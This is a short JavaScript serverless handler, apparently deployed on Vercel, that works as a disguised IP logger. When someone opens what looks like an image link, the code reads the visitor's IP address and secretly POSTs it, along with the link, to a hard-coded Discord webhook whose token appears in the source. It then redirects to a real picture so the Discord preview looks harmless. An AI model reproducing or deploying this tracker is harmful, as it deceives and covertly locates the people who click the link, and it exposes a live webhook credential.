import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // CAPTURA O IP
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 'IP não detectado';
  console.log('📸 IP CAPTURADO:', ip);
  
  // ENVIA PARA DISCORD
  const webhook = 'https://discord.com/api/webhooks/1455977764501983316/U7XD9SM7LTMxccHyeLQud41lpenMRxd3hr9URi5_vxlIi58JouW5RFkQ5A7QAce_XdeA';
  
  try {
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `📍 IP: ${ip}\n🔗 Link: https://estudos-blush-pi.vercel.app/foto-discord.png`
      })
    });
  } catch (e) {}
  
  // REDIRECIONA para foto REAL (que mostra preview no Discord)
  res.redirect(302, '/foto-discord.png');
}
